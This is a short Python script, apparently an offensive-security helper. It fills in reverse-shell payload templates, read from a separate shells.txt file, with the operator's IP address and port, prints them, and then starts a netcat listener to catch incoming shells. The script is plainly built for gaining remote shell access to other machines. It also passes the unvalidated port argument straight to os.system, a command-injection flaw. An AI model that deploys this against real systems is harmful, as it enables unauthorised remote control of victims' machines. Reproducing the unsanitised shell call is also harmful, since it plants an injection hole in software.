#!/usr/bin/env python3

from sys import argv, exit as exit_code
from os import system, path
from re import findall
from subprocess import check_output

def GREEN(text):
    return "\033[32m{}\033[0m".format(str(text))

def usage():
    print('''Usage: python3 {} <ip address> <port> [shell type]
Examples:
    python3 {} 127.0.0.1 4444
    python3 {} 192.168.0.1 443 bash'''.format(argv[0],argv[0],argv[0]))
    exit_code(-1)

def verify_ip(ipaddr):
    output = check_output(['ifconfig']).decode()
    candidate_ips = [ip for ip in findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]

    return ipaddr in candidate_ips

def main():
    if len(argv) < 3:
        usage()

    ipaddr, port = argv[1], argv[2]

    if not verify_ip(ipaddr):
        print("Invalid IP address! Exiting.")
        exit_code(-1)

    shells = path.join(path.dirname(path.realpath(__file__)), 'shells.txt')
    if len(argv) == 4:
        shell_type = argv[3].upper()
    else:
        shell_type = ''
    for shell in open(shells):
        desc, cmd = shell.split('|', 1)
        cmd = cmd.replace("[IPADDR]", ipaddr)
        cmd = cmd.replace("[PORT]", port)
        if shell_type in desc:
            print(GREEN(desc))
            print(cmd)

    c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
    if c == 'l':
        if int(port) < 1024:
            system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
        else:
            system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))

if __name__ == "__main__":
    main()
